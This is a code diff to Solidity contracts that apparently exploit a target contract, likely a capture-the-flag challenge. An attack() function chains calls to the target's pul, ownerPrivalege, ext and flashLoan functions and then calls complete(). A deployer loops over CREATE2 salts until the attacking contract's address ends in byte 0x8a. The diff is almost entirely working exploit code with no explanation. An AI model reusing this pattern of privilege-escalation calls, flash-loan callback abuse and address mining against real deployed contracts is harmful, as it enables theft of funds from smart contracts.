@@ -11,11 +11,14 @@ contract fig{
         return abi.encodeWithSignature("com()");
     }
 
-    function attack()public{
+    function attack()public payable{
+        (bool success,)=address(fun).call{value:1}("");
+        require(success,"call failed");
         fun.pul();
         fun.ownerPrivalege();
         fun.ext();
         fun.flashLoan(address(fun),0,figure());
+        complete();
     }
 
     function complete()public{
@@ -32,8 +35,22 @@ contract deploy{
         fun = _fun;
         creatCode = abi.encodePacked(type(fig).creationCode,abi.encode(fun));
     }
-    function deployed(bytes32 salt)public{
-        fi = new fig{salt : salt}(fun);
+    function figSalt()public returns(bytes32){
+        uint256 salt;
+        address addr;
+        for(uint i=0;i>=0;){
+            addr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xff),address(this),bytes32(salt),keccak256(creatCode))))));
+            if(uint160(addr)&0xff==uint8(0x8a)){
+                break;
+            }
+            salt+=1;
+        }
+        return(bytes32(salt));
+    }
+
+    function deployed()public{
+            fi = new fig{salt : figSalt()}(fun);
+            
     }
 
     function getHash()public view returns(bytes32){
